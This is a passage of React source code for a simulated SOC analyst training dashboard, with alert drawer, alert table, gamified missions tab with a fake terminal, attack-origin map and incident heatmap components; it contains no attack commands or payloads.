                    {running&&<span style={{ animation:"pulse 0.5s infinite" }}>█</span>}
                  </div>
                </div>

                {done.includes(step)&&(
                  <div style={{ marginTop:10,padding:"8px 12px",background:T.greenG,
                    border:`1px solid ${T.green}44`,borderRadius:4,
                    fontFamily:"'JetBrains Mono',monospace",fontSize:11,color:T.green }}>
                    ✓ Step complete
                  </div>
                )}
              </div>

              {/* Footer buttons */}
              <div style={{ padding:"12px 20px",borderTop:`1px solid ${T.border}`,
                display:"flex",gap:10,alignItems:"center" }}>
                <div style={{ flex:1,display:"flex",gap:8 }}>
                  {step>0&&(
                    <button onClick={()=>setStep(step-1)}
                      style={{ padding:"8px 16px",background:"transparent",border:`1px solid ${T.border}`,
                        borderRadius:4,color:T.ts,fontFamily:"'Rajdhani',sans-serif",fontWeight:700,
                        fontSize:11,letterSpacing:2,cursor:"pointer" }}>← PREV</button>
                  )}
                  {!done.includes(step)&&(
                    <button onClick={runStep} disabled={running}
                      style={{ padding:"8px 20px",background:running?"transparent":T.cyan,
                        border:`1px solid ${T.cyan}`,borderRadius:4,
                        color:running?T.cyan:T.bg,fontFamily:"'Rajdhani',sans-serif",fontWeight:700,
                        fontSize:11,letterSpacing:2,cursor:running?"not-allowed":"pointer",
                        transition:"all 0.2s" }}>
                      {running?"EXECUTING…":"▶ RUN STEP"}
                    </button>
                  )}
                  {done.includes(step)&&step<steps.length-1&&(
                    <button onClick={()=>setStep(step+1)}
                      style={{ padding:"8px 20px",background:T.cyan,border:"none",
                        borderRadius:4,color:T.bg,fontFamily:"'Rajdhani',sans-serif",fontWeight:700,
                        fontSize:11,letterSpacing:2,cursor:"pointer" }}>NEXT STEP →</button>
                  )}
                </div>

                <div style={{ display:"flex",gap:8,alignItems:"center" }}>
                  <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:10,color:T.ts }}>
                    {done.length}/{steps.length} steps
                  </div>
                  {allDone&&(
                    <button onClick={doNeutralize}
                      style={{ padding:"9px 20px",background:T.green,border:"none",borderRadius:4,
                        color:T.bg,fontFamily:"'Rajdhani',sans-serif",fontWeight:700,fontSize:12,
                        letterSpacing:2,cursor:"pointer",boxShadow:`0 0 20px ${T.greenG}`,
                        animation:"pulse 1.5s ease-in-out infinite" }}>
                      ⚡ NEUTRALIZE THREAT
                    </button>
                  )}
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════
   ALERT DRAWER  (with Investigate / Escalate)
═══════════════════════════════════════════════ */
function AlertDrawer({alert:a, onClose, onInvestigate, alerts, setAlerts}){
  if(!a) return null;
  const color=sc(a.sev);
  const hasPlaybook=!!PLAYBOOKS[a.type];

  const escalate=()=>{
    setAlerts(prev=>prev.map(x=>x.id===a.id?{...x,status:"INVESTIGATING",analyst:"YOU"}:x));
    onClose();
  };

  return(
    <>
      <div onClick={onClose} style={{ position:"fixed",inset:0,background:"rgba(4,9,15,0.55)",zIndex:298 }}/>
      <div style={{ position:"fixed",right:0,top:0,bottom:0,width:440,background:T.panel,
        borderLeft:`1px solid ${T.line}`,zIndex:299,display:"flex",flexDirection:"column",
        boxShadow:"-8px 0 40px rgba(0,0,0,0.8)",fontFamily:"'JetBrains Mono',monospace" }}>
        <div style={{ padding:"14px 18px",borderBottom:`1px solid ${T.border}`,
          display:"flex",justifyContent:"space-between",alignItems:"center" }}>
          <span style={{ fontSize:10,color:T.ts,letterSpacing:2 }}>ALERT DETAIL</span>
          <button onClick={onClose} style={{ background:"none",border:"none",color:T.ts,cursor:"pointer",fontSize:17 }}>✕</button>
        </div>
        <div style={{ flex:1,overflowY:"auto",padding:"18px" }}>
          <div style={{ marginBottom:18 }}>
            <div style={{ fontFamily:"'Rajdhani',sans-serif",fontSize:19,fontWeight:700,color,marginBottom:5 }}>{a.type}</div>
            <div style={{ display:"flex",gap:8,alignItems:"center" }}>
              <SevBadge sev={a.sev}/>
              <span style={{ fontSize:10,color:T.ts }}>{a.id}</span>
              {a.neutralized&&<span style={{ padding:"2px 8px",borderRadius:3,fontSize:9,
                color:T.green,border:`1px solid ${T.green}55`,background:`${T.green}10` }}>NEUTRALIZED</span>}
            </div>
          </div>

          {[["TIMESTAMP",a.ts.toISOString()],["SOURCE IP",a.src],["DESTINATION",a.dst],
            ["MITRE ATT&CK",a.mitre],["SENSOR",a.sensor],["STATUS",a.status],["ANALYST",a.analyst]
          ].map(([k,v])=>(
            <div key={k} style={{ marginBottom:9,padding:"8px 12px",background:T.surface,
              borderRadius:4,borderLeft:`2px solid ${T.border}` }}>
              <div style={{ fontSize:8,color:T.ts,letterSpacing:2,marginBottom:2 }}>{k}</div>
              <div style={{ fontSize:11,color:T.tp }}>{v}</div>
            </div>
          ))}

          {!a.neutralized&&hasPlaybook&&(
            <div style={{ marginTop:14,padding:"10px 12px",background:`${color}0a`,
              border:`1px solid ${color}44`,borderRadius:5 }}>
              <div style={{ fontSize:10,color,marginBottom:4,fontWeight:700 }}>
                🔬 INVESTIGATION PLAYBOOK AVAILABLE
              </div>
              <div style={{ fontSize:10,color:T.ts,lineHeight:1.6 }}>
                {PLAYBOOKS[a.type].summary}
              </div>
              <div style={{ fontSize:9,color:T.td,marginTop:6 }}>
                {PLAYBOOKS[a.type].steps.length} remediation steps · Interactive terminal
              </div>
            </div>
          )}

          {a.neutralized&&(
            <div style={{ marginTop:14,padding:"12px",background:T.greenG,
              border:`1px solid ${T.green}44`,borderRadius:5,textAlign:"center" }}>
              <div style={{ fontSize:22,marginBottom:6 }}>✅</div>
              <div style={{ fontSize:11,color:T.green,fontWeight:700 }}>THREAT SUCCESSFULLY NEUTRALIZED</div>
            </div>
          )}
        </div>

        {!a.neutralized&&(
          <div style={{ padding:"13px 18px",borderTop:`1px solid ${T.border}`,display:"flex",gap:8 }}>
            {hasPlaybook&&(
              <button onClick={()=>{ onClose(); onInvestigate(a); }}
                style={{ flex:2,padding:"9px 0",background:T.orange,border:"none",borderRadius:4,
                  color:T.bg,fontFamily:"'Rajdhani',sans-serif",fontWeight:700,fontSize:11,
                  letterSpacing:2,cursor:"pointer",boxShadow:`0 0 14px ${T.orangeG}` }}>
                🔬 INVESTIGATE
              </button>
            )}
            <button onClick={escalate}
              style={{ flex:1,padding:"9px 0",background:"transparent",border:`1px solid ${T.red}`,
                borderRadius:4,color:T.red,fontFamily:"'Rajdhani',sans-serif",fontWeight:700,
                fontSize:11,letterSpacing:2,cursor:"pointer" }}>
              ⚠️ ESCALATE
            </button>
          </div>
        )}
      </div>
    </>
  );
}

/* ═══════════════════════════════════════════════
   ALERT TABLE
═══════════════════════════════════════════════ */
function AlertTable({alerts,onSelect,selected,compact=false}){
  const cols=compact
    ?["ID","TIME","SEV","TYPE","STATUS"]
    :["ID","TIME","SEV","TYPE","SOURCE","DEST","MITRE","STATUS","ANALYST"];
  return(
    <div style={{ overflowX:"auto" }}>
      <table style={{ width:"100%",borderCollapse:"collapse",fontFamily:"'JetBrains Mono',monospace",fontSize:11 }}>
        <thead>
          <tr style={{ borderBottom:`1px solid ${T.border}` }}>
            {cols.map(h=><th key={h} style={{ padding:"5px 9px",textAlign:"left",color:T.ts,fontSize:9,letterSpacing:1.5,fontWeight:400,whiteSpace:"nowrap" }}>{h}</th>)}
          </tr>
        </thead>
        <tbody>
          {alerts.map(a=>{
            const stc={OPEN:T.red,INVESTIGATING:T.orange,CLOSED:T.ts}[a.status]||T.ts;
            const isSel=selected?.id===a.id;
            return(
              <tr key={a.id} onClick={()=>onSelect(isSel?null:a)}
                style={{ borderBottom:`1px solid ${T.border}44`,cursor:"pointer",
                  background:a.neutralized?`${T.green}08`:isSel?`${sc(a.sev)}10`:"transparent",
                  transition:"background 0.15s" }}>
                <td style={{ padding:"6px 9px",color:a.neutralized?T.green:T.cyan }}>{a.id}</td>
                <td style={{ padding:"6px 9px",color:T.ts,whiteSpace:"nowrap" }}>
                  {a.ts.toLocaleTimeString([],{hour:"2-digit",minute:"2-digit",second:"2-digit"})}
                </td>
                <td style={{ padding:"6px 9px" }}><SevBadge sev={a.sev}/></td>
                <td style={{ padding:"6px 9px",color:T.tp,whiteSpace:"nowrap" }}>
                  {a.type}{a.neutralized&&" ✅"}
                </td>
                {!compact&&<><td style={{ padding:"6px 9px",color:T.ts }}>{a.src}</td>
                  <td style={{ padding:"6px 9px",color:T.ts }}>{a.dst}</td>
                  <td style={{ padding:"6px 9px",color:T.purple,whiteSpace:"nowrap" }}>{a.mitre}</td></>}
                <td style={{ padding:"6px 9px" }}>
                  <span style={{ padding:"2px 7px",borderRadius:3,fontSize:9,letterSpacing:1,
                    color:a.neutralized?T.green:stc,border:`1px solid ${a.neutralized?T.green:stc}55`,
                    background:`${a.neutralized?T.green:stc}10` }}>
                    {a.neutralized?"NEUTRALIZED":a.status}
                  </span>
                </td>
                {!compact&&<td style={{ padding:"6px 9px",color:T.ts }}>{a.analyst}</td>}
              </tr>
            );
          })}
        </tbody>
      </table>
    </div>
  );
}

/* ═══════════════════════════════════════════════
   MISSIONS TAB
═══════════════════════════════════════════════ */
function MissionsTab(){
  const [missions,setMissions]=useState(()=>MISSIONS_DATA.map(m=>({
    ...m, steps:m.steps.map(s=>({...s,completed:false})),
    status:"AVAILABLE", progress:0
  })));
  const [activeMission,setActiveMission]=useState(null);
  const [running,setRunning]=useState(false);
  const [output,setOutput]=useState("");
  const [curStep,setCurStep]=useState(0);
  const [doneSteps,setDoneSteps]=useState([]);
  const [complete,setComplete]=useState(false);
  const [filter,setFilter]=useState("ALL");

  const startMission=m=>{
    setActiveMission(m);
    setCurStep(0);
    setDoneSteps([]);
    setOutput("");
    setComplete(false);
    setRunning(false);
  };

  const runStep=()=>{
    if(!activeMission||running||doneSteps.includes(curStep)) return;
    const step=activeMission.steps[curStep];
    setRunning(true);
    setOutput("");
    const txt=`analyst@soc-sim:~$ ${step.cmd}\n`;
    let i=0;
    const iv=setInterval(()=>{
      setOutput(txt.slice(0,i));
      i++;
      if(i>txt.length) clearInterval(iv);
    },14);
    setTimeout(()=>{
      clearInterval(iv);
      setOutput(txt+"\n"+step.result);
      setRunning(false);
      const newDone=[...doneSteps,curStep];
      setDoneSteps(newDone);
      const pct=Math.round((newDone.length/activeMission.steps.length)*100);
      setMissions(prev=>prev.map(m=>m.id===activeMission.id?{...m,progress:pct}:m));
      setActiveMission(prev=>({...prev,progress:pct}));
      if(newDone.length===activeMission.steps.length){
        setTimeout(()=>{
          setComplete(true);
          setMissions(prev=>prev.map(m=>m.id===activeMission.id?{...m,status:"COMPLETED",progress:100}:m));
        },600);
      } else {
        setTimeout(()=>setCurStep(curStep+1),700);
      }
    },txt.length*14+500);
  };

  const cats=["ALL",...[...new Set(MISSIONS_DATA.map(m=>m.category))]];
  const filtered=filter==="ALL"?missions:missions.filter(m=>m.category===filter);
  const completed=missions.filter(m=>m.status==="COMPLETED").length;

  if(activeMission){
    const step=activeMission.steps[curStep]||activeMission.steps[activeMission.steps.length-1];
    const color=sc(activeMission.sev);

    return(
      <div style={{ display:"flex",flexDirection:"column",gap:14 }}>
        {/* Mission header */}
        <div style={{ background:T.panel,border:`1px solid ${color}44`,borderRadius:5,padding:"16px 18px",
          display:"flex",justifyContent:"space-between",alignItems:"center" }}>
          <div>
            <div style={{ display:"flex",gap:10,alignItems:"center",marginBottom:6 }}>
              <SevBadge sev={activeMission.sev}/>
              <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:10,color:T.ts }}>{activeMission.category}</span>
              {activeMission.cve&&<span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:10,color:T.cyan }}>{activeMission.cve}</span>}
              <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:10,color:T.yellow }}>+{activeMission.xp} XP</span>
              <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:10,color:T.ts }}>⏱ {activeMission.time}</span>
            </div>
            <div style={{ fontFamily:"'Rajdhani',sans-serif",fontSize:18,fontWeight:700,color:T.tp }}>{activeMission.title}</div>
          </div>
          <button onClick={()=>setActiveMission(null)}
            style={{ padding:"7px 14px",background:"transparent",border:`1px solid ${T.border}`,
              borderRadius:4,color:T.ts,fontFamily:"'Rajdhani',sans-serif",fontWeight:700,
              fontSize:11,letterSpacing:2,cursor:"pointer" }}>← BACK</button>
        </div>

        {complete?(
          <div style={{ background:T.panel,border:`1px solid ${T.green}`,borderRadius:8,
            padding:"48px 24px",textAlign:"center",boxShadow:`0 0 40px ${T.greenG}` }}>
            <div style={{ fontSize:56,marginBottom:12 }}>🎉</div>
            <div style={{ fontFamily:"'Rajdhani',sans-serif",fontSize:26,fontWeight:700,
              color:T.green,letterSpacing:3,marginBottom:8 }}>MISSION COMPLETE</div>
            <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:13,color:T.ts,marginBottom:6 }}>
              {activeMission.title}
            </div>
            <div style={{ fontFamily:"'Rajdhani',sans-serif",fontSize:20,color:T.yellow,marginBottom:20 }}>
              +{activeMission.xp} XP EARNED
            </div>
            <div style={{ display:"flex",gap:12,justifyContent:"center" }}>
              <button onClick={()=>setActiveMission(null)}
                style={{ padding:"10px 28px",background:T.green,border:"none",borderRadius:4,
                  color:T.bg,fontFamily:"'Rajdhani',sans-serif",fontWeight:700,fontSize:13,letterSpacing:3,cursor:"pointer" }}>
                ← BACK TO MISSIONS
              </button>
            </div>
          </div>
        ):(
          <div style={{ display:"grid",gridTemplateColumns:"280px 1fr",gap:14 }}>
            {/* Steps sidebar */}
            <div style={{ background:T.panel,border:`1px solid ${T.border}`,borderRadius:5,overflow:"hidden" }}>
              <div style={{ padding:"10px 14px",borderBottom:`1px solid ${T.border}`,background:T.surface,
                fontFamily:"'JetBrains Mono',monospace",fontSize:9,color:T.ts,letterSpacing:2 }}>
                MISSION OBJECTIVES
              </div>
              <div style={{ padding:"10px 0" }}>
                {activeMission.steps.map((s,i)=>{
                  const isDone=doneSteps.includes(i), isCur=i===curStep;
                  return(
                    <div key={s.id} style={{ padding:"9px 14px",display:"flex",alignItems:"center",gap:8,
                      background:isCur?`${color}15`:"transparent",borderBottom:`1px solid ${T.border}33`,
                      borderLeft:isCur?`3px solid ${color}`:"3px solid transparent" }}>
                      <div style={{ width:20,height:20,borderRadius:"50%",flexShrink:0,
                        background:isDone?T.green:isCur?color:T.border,
                        display:"flex",alignItems:"center",justifyContent:"center",
                        fontSize:9,color:(isDone||isCur)?T.bg:T.ts,fontWeight:700 }}>
                        {isDone?"✓":i+1}
                      </div>
                      <div>
                        <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:9,
                          color:isDone?T.green:isCur?color:T.ts,lineHeight:1.3 }}>{s.label}</div>
                        <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:8,color:T.td }}>{s.tool}</div>
                      </div>
                    </div>
                  );
                })}
              </div>
              {/* Progress bar */}
              <div style={{ padding:"12px 14px",borderTop:`1px solid ${T.border}` }}>
                <div style={{ display:"flex",justifyContent:"space-between",fontSize:9,color:T.ts,
                  fontFamily:"'JetBrains Mono',monospace",marginBottom:5 }}>
                  <span>PROGRESS</span><span>{doneSteps.length}/{activeMission.steps.length}</span>
                </div>
                <div style={{ height:4,background:T.border,borderRadius:2 }}>
                  <div style={{ height:"100%",width:`${(doneSteps.length/activeMission.steps.length)*100}%`,
                    background:T.cyan,borderRadius:2,transition:"width 0.4s" }}/>
                </div>
              </div>
            </div>

            {/* Step execution */}
            <div style={{ background:T.panel,border:`1px solid ${T.border}`,borderRadius:5,overflow:"hidden",display:"flex",flexDirection:"column" }}>
              <div style={{ padding:"10px 16px",borderBottom:`1px solid ${T.border}`,background:T.surface,
                display:"flex",justifyContent:"space-between",alignItems:"center" }}>
                <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:10,color:color,letterSpacing:2 }}>
                  STEP {curStep+1}: {step.label}
                </span>
                <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:9,color:T.ts }}>{step.tool}</span>
              </div>
              <div style={{ flex:1,padding:"16px" }}>
                <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:11,color:T.ts,
                  padding:"10px 12px",background:T.surface,borderRadius:4,
                  borderLeft:`2px solid ${T.border}`,marginBottom:14,lineHeight:1.6 }}>
                  {step.desc}
                </div>
                {/* Terminal */}
                <div style={{ background:"#020609",border:`1px solid ${T.line}`,borderRadius:5,overflow:"hidden" }}>
                  <div style={{ padding:"6px 12px",borderBottom:`1px solid ${T.line}`,
                    background:T.surface,display:"flex",alignItems:"center",gap:6 }}>
                    {["#f03b3b","#f0c040","#00c875"].map(c=>(
                      <div key={c} style={{ width:10,height:10,borderRadius:"50%",background:c,opacity:0.7 }}/>
                    ))}
                    <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:9,color:T.ts,marginLeft:6 }}>
                      analyst@soc-sim:~$
                    </span>
                  </div>
                  <div style={{ padding:"14px 16px",minHeight:120,maxHeight:220,overflowY:"auto",
                    fontFamily:"'JetBrains Mono',monospace",fontSize:12,color:T.green,
                    lineHeight:1.7,whiteSpace:"pre-wrap",wordBreak:"break-all" }}>
                    {output||(doneSteps.includes(curStep)
                      ?<span style={{ color:T.ts }}>Step executed successfully. ✓</span>
                      :<span style={{ color:T.td }}>Ready to execute. Click RUN STEP →</span>)}
                    {running&&<span style={{ animation:"pulse 0.5s infinite" }}>█</span>}
                  </div>
                </div>
              </div>
              <div style={{ padding:"12px 16px",borderTop:`1px solid ${T.border}`,display:"flex",gap:10 }}>
                {curStep>0&&(
                  <button onClick={()=>setCurStep(curStep-1)}
                    style={{ padding:"8px 16px",background:"transparent",border:`1px solid ${T.border}`,
                      borderRadius:4,color:T.ts,fontFamily:"'Rajdhani',sans-serif",fontWeight:700,
                      fontSize:11,letterSpacing:2,cursor:"pointer" }}>← PREV</button>
                )}
                {!doneSteps.includes(curStep)?(
                  <button onClick={runStep} disabled={running}
                    style={{ padding:"8px 22px",background:running?"transparent":T.cyan,
                      border:`1px solid ${T.cyan}`,borderRadius:4,color:running?T.cyan:T.bg,
                      fontFamily:"'Rajdhani',sans-serif",fontWeight:700,fontSize:11,
                      letterSpacing:2,cursor:running?"not-allowed":"pointer",transition:"all 0.2s" }}>
                    {running?"EXECUTING…":"▶ RUN STEP"}
                  </button>
                ):(
                  curStep<activeMission.steps.length-1&&(
                    <button onClick={()=>setCurStep(curStep+1)}
                      style={{ padding:"8px 22px",background:T.cyan,border:"none",borderRadius:4,
                        color:T.bg,fontFamily:"'Rajdhani',sans-serif",fontWeight:700,fontSize:11,
                        letterSpacing:2,cursor:"pointer" }}>NEXT →</button>
                  )
                )}
              </div>
            </div>
          </div>
        )}
      </div>
    );
  }

  return(
    <div style={{ display:"flex",flexDirection:"column",gap:14 }}>
      {/* Stats row */}
      <div style={{ display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:10 }}>
        <StatCard label="TOTAL MISSIONS"     value={missions.length}   sub="Available"         color={T.cyan}   icon="🎯"/>
        <StatCard label="COMPLETED"          value={completed}         sub={`${Math.round(completed/missions.length*100)}% complete`} color={T.green} icon="✅"/>
        <StatCard label="IN PROGRESS"        value={missions.filter(m=>m.status==="IN_PROGRESS").length} sub="Active sessions" color={T.orange} icon="⚡"/>
        <StatCard label="XP AVAILABLE"       value={missions.filter(m=>m.status!=="COMPLETED").reduce((a,m)=>a+m.xp,0)} sub="Total earnable" color={T.yellow} icon="⭐"/>
      </div>

      {/* Filter */}
      <div style={{ display:"flex",gap:8,flexWrap:"wrap",alignItems:"center" }}>
        {cats.map(c=>(
          <button key={c} onClick={()=>setFilter(c)}
            style={{ padding:"4px 12px",border:`1px solid ${filter===c?T.cyan:T.border}`,
              borderRadius:3,background:filter===c?`${T.cyan}18`:"transparent",
              color:filter===c?T.cyan:T.ts,fontFamily:"'JetBrains Mono',monospace",
              fontSize:9,letterSpacing:1,cursor:"pointer" }}>{c.toUpperCase()}</button>
        ))}
        <span style={{ marginLeft:"auto",fontFamily:"'JetBrains Mono',monospace",fontSize:10,color:T.ts }}>
          {filtered.length} missions
        </span>
      </div>

      {/* Mission cards */}
      <div style={{ display:"grid",gridTemplateColumns:"repeat(2,1fr)",gap:12 }}>
        {filtered.map(m=>{
          const color=sc(m.sev);
          const done=m.status==="COMPLETED";
          return(
            <div key={m.id} style={{ background:T.panel,border:`1px solid ${done?T.green+"55":T.border}`,
              borderRadius:6,overflow:"hidden",transition:"border-color 0.2s",
              boxShadow:done?`0 0 20px ${T.green}15`:"none" }}>
              <div style={{ padding:"14px 16px",borderBottom:`1px solid ${T.border}` }}>
                <div style={{ display:"flex",gap:8,alignItems:"center",marginBottom:8,flexWrap:"wrap" }}>
                  <SevBadge sev={m.sev}/>
                  <span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:9,
                    color:T.purple,border:`1px solid ${T.purple}55`,borderRadius:2,padding:"1px 6px",
                    background:`${T.purple}10` }}>{m.category}</span>
                  {m.cve&&<span style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:9,color:T.cyan }}>{m.cve}</span>}
                </div>
                <div style={{ fontFamily:"'Rajdhani',sans-serif",fontSize:15,fontWeight:700,
                  color:done?T.green:T.tp,marginBottom:6 }}>{m.title}</div>
                <div style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:10,color:T.ts,
                  lineHeight:1.5,marginBottom:10 }}>{m.desc}</div>
                <div style={{ display:"flex",gap:14,fontSize:10,color:T.ts,
                  fontFamily:"'JetBrains Mono',monospace" }}>
                  <span>⏱ {m.time}</span>
                  <span style={{ color:T.yellow }}>+{m.xp} XP</span>
                  <span>{m.steps.length} steps</span>
                </div>
              </div>
              <div style={{ padding:"12px 16px" }}>
                <div style={{ marginBottom:10 }}>
                  <div style={{ display:"flex",justifyContent:"space-between",fontSize:9,
                    color:T.ts,fontFamily:"'JetBrains Mono',monospace",marginBottom:4 }}>
                    <span>PROGRESS</span><span>{m.progress}%</span>
                  </div>
                  <div style={{ height:3,background:T.border,borderRadius:2 }}>
                    <div style={{ height:"100%",width:`${m.progress}%`,
                      background:done?T.green:T.cyan,borderRadius:2,transition:"width 0.4s" }}/>
                  </div>
                </div>
                <div style={{ display:"flex",gap:8,alignItems:"center" }}>
                  <div style={{ flex:1 }}>
                    <div style={{ display:"flex",gap:4,flexWrap:"wrap" }}>
                      {m.objectives.slice(0,2).map((o,i)=>(
                        <span key={i} style={{ fontFamily:"'JetBrains Mono',monospace",fontSize:8,
                          color:T.td,padding:"2px 6px",background:T.surface,borderRadius:2 }}>
                          {o.slice(0,30)}{o.length>30?"…":""}
                        </span>
                      ))}
                    </div>
                  </div>
                  {done?(
                    <span style={{ fontFamily:"'Rajdhani',sans-serif",fontWeight:700,fontSize:11,
                      color:T.green,letterSpacing:1 }}>✓ COMPLETE</span>
                  ):(
                    <button onClick={()=>startMission(m)}
                      style={{ padding:"7px 18px",background:color,border:"none",borderRadius:4,
                        color:T.bg,fontFamily:"'Rajdhani',sans-serif",fontWeight:700,fontSize:11,
                        letterSpacing:2,cursor:"pointer",flexShrink:0,
                        boxShadow:`0 0 14px ${color}44` }}>
                      {m.progress>0?"RESUME ▶":"START ▶"}
                    </button>
                  )}
                </div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

/* ═══════════════════════════════════════════════
   LEAFLET MAP
═══════════════════════════════════════════════ */
function LeafletMap({attacks}){
  const mapRef=useRef(null), inst=useRef(null);
  const [loaded,setLoaded]=useState(!!window.L);
  const [sel,setSel]=useState(null);

  useEffect(()=>{
    if(window.L){setLoaded(true);return;}
    const lk=document.createElement("link");
    lk.rel="stylesheet";lk.href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css";
    document.head.appendChild(lk);
    const sc2=document.createElement("script");
    sc2.src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js";
    sc2.onload=()=>setLoaded(true);
    document.head.appendChild(sc2);
  },[]);

  useEffect(()=>{
    if(!loaded||!mapRef.current||inst.current) return;
    const L=window.L;
    const map=L.map(mapRef.current,{center:[20,10],zoom:2,zoomControl:true,attributionControl:false});
    L.tileLayer("https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png",
      {maxZoom:19,subdomains:"abcd"}).addTo(map);
    const st=document.createElement("style");
    st.textContent=`.leaflet-tooltip{background:transparent!important;border:none!important;box-shadow:none!important;padding:0!important}.leaflet-tooltip::before{display:none!important}`;
    document.head.appendChild(st);
    attacks.forEach(a=>{
      const color=sc(a.sev);
      const size=Math.max(14,Math.min(52,Math.sqrt(a.count)*1.5));
      const icon=L.divIcon({className:"",
        html:`<div style="width:${size}px;height:${size}px;border-radius:50%;background:${color}22;border:2px solid ${color};box-shadow:0 0 14px ${color}88;${a.sev==="CRITICAL"?"animation:pulse 1.8s ease-in-out infinite;":""}"></div>`,
        iconSize:[size,size],iconAnchor:[size/2,size/2]});
      const marker=L.marker([a.lat,a.lng],{icon}).addTo(map);
      marker.on("click",()=>setSel(a));
      marker.bindTooltip(
        `<div style="background:#0a1320;border:1px solid ${color};border-radius:4px;padding:7px 11px;font-family:'JetBrains Mono',monospace;font-size:11px;color:#c8dff0;min-width:160px"><b style="color:${color};display:block;margin-bottom:3px">${a.city}, ${a.country}</b>Events: ${a.count.toLocaleString()}<br/>Severity: <span style="color:${color}">${a.sev}</span></div>`,
        {opacity:1}
      );
    });
    inst.current=map;
    return()=>{ if(inst.current){inst.current.remove();inst.current=null;} };
  },[loaded,attacks]);

  return(
    <Panel title="🌐 ATTACK ORIGIN RADAR — GLOBAL" accent={T.cyan} action={<Dot color={T.green} pulse/>}>
      <div style={{ position:"relative" }}>
        {!loaded&&<div style={{ height:380,display:"flex",alignItems:"center",justifyContent:"center",
          color:T.ts,fontFamily:"'JetBrains Mono',monospace",fontSize:11 }}>Loading Leaflet…</div>}
        <div ref={mapRef} style={{ height:380,borderRadius:4,display:loaded?"block":"none" }}/>
        {sel&&(
          <div style={{ position:"absolute",top:12,right:12,zIndex:1000,background:T.panel,
            border:`1px solid ${sc(sel.sev)}`,borderRadius:5,padding:"12px 14px",
            fontFamily:"'JetBrains Mono',monospace",minWidth:210,
            boxShadow:`0 0 20px ${sc(sel.sev)}44` }}>
            <div style={{ display:"flex",justifyContent:"space-between",marginBottom:8 }}>
              <span style={{ color:sc(sel.sev),fontWeight:700,fontSize:12 }}>{sel.city}, {sel.country}</span>
              <button onClick={()=>setSel(null)} style={{ background:"none",border:"none",color:T.ts,cursor:"pointer",fontSize:14 }}>✕</button>
            </div>
            <div style={{ fontSize:11,color:T.ts,lineHeight:1.9 }}>
              <div>Events: <span style={{ color:T.tp }}>{sel.count.toLocaleString()}</span></div>
              <div>Severity: <span style={{ color:sc(sel.sev) }}>{sel.sev}</span></div>
              <div>Coords: <span style={{ color:T.td }}>{sel.lat}°, {sel.lng}°</span></div>
            </div>
          </div>
        )}
      </div>
    </Panel>
  );
}

/* ═══════════════════════════════════════════════
   INCIDENT HEATMAP  (canvas)
═══════════════════════════════════════════════ */
function IncidentHeatmap(){
  const cvRef=useRef(null);
  const [tip,setTip]=useState(null);
  const data=useMemo(()=>makeHeatmap(),[]);
  const DAYS=["Mon","Tue","Wed","Thu","Fri","Sat","Sun"];
  const CW=22,CH=22,PL=36,PT=26;
  const W=PL+24*CW+2,H=PT+7*CH+2;

  useEffect(()=>{
    const cv=cvRef.current; if(!cv) return;
    const ctx=cv.getContext("2d");
    ctx.clearRect(0,0,cv.width,cv.height);
    const maxV=Math.max(...data.flat().map(c=>c.v),1);
    data.forEach((row,di)=>{
      row.forEach(({h,v})=>{
        const x=PL+h*CW,y=PT+di*CH,t=v/maxV;
        let r,g,b;
        if(t<0.001){r=14;g=22;b=38;}
        else if(t<0.25){r=14;g=28;b=52;}
        else if(t<0.5){r=Math.round(30+t*140);g=Math.round(40+t*60);b=40;}
        else if(t<0.75){r=Math.round(180+t*60);g=Math.round(80*t);b=20;}
        else{r=240;g=Math.round(50+t*60);b=20;}
        ctx.fillStyle=`rgb(${r},${g},${b})`;
        ctx.fillRect(x+1,y+1,CW-2,CH-2);
        if(v>0){
          ctx.fillStyle=`rgba(255,255,255,${Math.min(0.65,t*0.75)})`;
          ctx.font="7px 'JetBrains Mono',monospace";
          ctx.textAlign="center";
          ctx.fillText(v>99?"99+":v,x+CW/2,y+CH/2+3);
        }
      });
    });
    ctx.fillStyle=T.ts;ctx.font="10px 'JetBrains Mono',monospace";ctx.textAlign="right";
    DAYS.forEach((d,i)=>ctx.fillText(d,PL-5,PT+i*CH+CH/2+3));
    ctx.textAlign="center";
    for(let h=0;h<24;h+=4) ctx.fillText(h.toString().padStart(2,"0"),PL+h*CW+CW/2,PT-6);
  },[data]);

  const onMM=e=>{
    const cv=cvRef.current; if(!cv) return;
    const rect=cv.getBoundingClientRect();
    const mx=e.clientX-rect.left,my=e.clientY-rect.top;
    const h=Math.floor((mx-PL)/CW),di=Math.floor((my-PT)/CH);
    if(h>=0&&h<24&&di>=0&&di<7) setTip({x:e.clientX,y:e.clientY,day:DAYS[di],h,v:data[di][h].v});
    else setTip(null);
  };

  return(
    <Panel title="🔥 INCIDENT HEATMAP — 7 DAYS × HOUR" accent={T.orange}
      action={
        <div style={{ display:"flex",gap:8,alignItems:"center" }}>
          {[["LOW","#0e1626"],["MED","rgba(130,50,20,.9)"],["HIGH",T.orange],["CRIT",T.red]].map(([l,c])=>(
            <div key={l} style={{ display:"flex",alignItems:"center",gap:4 }}>
              <div style={{ width:10,height:10,borderRadius:2,background:c,border:`1px solid ${T.border}` }}/>
              <span style={{ fontSize:9,color:T.ts,fontFamily:"'JetBrains Mono',monospace" }}>{l}</span>
            </div>
          ))}
        </div>
      }>
      <div style={{ overflowX:"auto",position:"relative" }}>
